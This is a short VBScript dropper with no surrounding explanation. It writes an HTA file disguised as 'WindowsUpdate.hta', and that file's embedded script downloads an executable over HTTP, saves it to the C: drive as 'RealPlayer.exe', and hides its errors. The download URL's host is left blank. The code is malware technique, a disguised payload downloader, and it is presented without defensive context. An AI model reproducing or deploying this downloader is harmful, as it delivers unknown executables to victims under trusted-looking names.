on error resume next
set conn = CreateObject("ADODB.Recordset")
   With conn
       .Fields.Append "conn", 200, "3000"
       Call .Open
       Call .AddNew
       .Fields("conn").Value = "spacer"
       Call .AddNew
       .Fields("conn").Value = "<script language=vbscript>: on error resume next : set o = CreateObject(""msxml2.XMLHTTP"") : o.open ""GET"",""http:///RealPlayer.exe"",False : o.send : set s = createobject(""adodb.stream"") : s.type=1 : s.open : s.write o.responseBody : s.savetofile ""C:\RealPlayer.exe"",2 : window.close()</script>"
       Call .Update
   End With
conn.Save "C:\WindowsUpdate.hta", adPersistXML
conn.Close
